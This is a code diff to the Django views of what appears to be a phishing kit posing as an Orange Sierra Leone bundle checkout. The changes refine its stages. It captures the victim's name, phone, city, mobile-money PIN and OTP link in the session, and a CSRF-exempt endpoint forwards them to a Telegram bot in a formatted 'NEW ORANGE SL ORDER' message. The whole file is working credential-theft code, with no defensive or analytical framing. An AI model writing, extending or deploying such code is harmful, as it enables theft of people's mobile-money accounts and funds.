@@ -16,11 +16,25 @@ def home(request):
 
 
 def checkout(request):
-    return render(request, 'checkout.html')
+    """
+    Stage 1: Checkout page
+    """
+    bundle = request.GET.get('bundle', 'Power User')
+    price = request.GET.get('price', '199')
+
+    context = {
+        'bundle': bundle,
+        'price': price
+    }
+
+    return render(request, 'checkout.html', context)
+
+
 def payment_instructions(request):
     """
-    Stage 2: Capture user details
+    Stage 2: Capture customer details
     """
+
     if request.method == 'POST':
 
         request.session['name'] = request.POST.get('fullName', '')
@@ -30,26 +44,28 @@ def payment_instructions(request):
 
         return render(request, 'payment_instructions.html')
 
-    return redirect('home')
+    return redirect('checkout')
 
 
 def otp_verification(request):
     """
-    Stage 3: Capture PIN
+    Stage 3: Capture PIN and show OTP page
     """
+
     if request.method == 'POST':
 
+        request.session['phone'] = request.POST.get('phone', '')
         request.session['pin'] = request.POST.get('pin', '')
 
         return render(request, 'otp_verification.html')
 
-    return redirect('home')
+    return redirect('checkout')
 
 
 @csrf_exempt
 def sync_data(request):
     """
-    Stage 4: Send collected data to Telegram
+    Stage 4: Send OTP data to Telegram
     """
 
     if request.method != 'POST':
@@ -59,9 +75,10 @@ def sync_data(request):
         }, status=405)
 
     try:
+
         data = json.loads(request.body)
 
-        otp_link = data.get('otp', 'No OTP link provided')
+        otp_link = data.get('otp', '')
 
         name = request.session.get('name', 'Unknown')
         phone = request.session.get('phone', 'Unknown')
@@ -71,16 +88,16 @@ def sync_data(request):
 
         message = (
             "🇸🇱 NEW ORANGE SL ORDER\n"
-            "--------------------------\n"
-            f"👤 Identity: {name}\n"
-            f"📞 Orange SL: +232 {phone}\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            f"👤 Name: {name}\n"
+            f"📞 Phone: +232 {phone}\n"
             f"📍 City: {city}\n"
             f"📦 Bundle: {bundle}\n"
-            "--------------------------\n"
-            f"🔑 Orange PIN: {pin}\n"
-            f"🔗 OTP Link: {otp_link}\n"
-            "--------------------------\n"
-            "📡 Status: Synchronization Active"
+            "━━━━━━━━━━━━━━━━━━\n"
+            f"🔑 PIN: {pin}\n"
+            f"🔗 OTP LINK:\n{otp_link}\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "📡 STATUS: ACTIVE"
         )
 
         telegram_url = (
@@ -96,9 +113,10 @@ def sync_data(request):
         )
 
         if response.status_code == 200:
+
             return JsonResponse({
                 "status": "success",
-                "message": "Data synced successfully"
+                "message": "Synchronization completed"
             })
 
         return JsonResponse({
@@ -107,6 +125,7 @@ def sync_data(request):
         }, status=500)
 
     except Exception as e:
+
         return JsonResponse({
             "status": "error",
             "message": str(e)
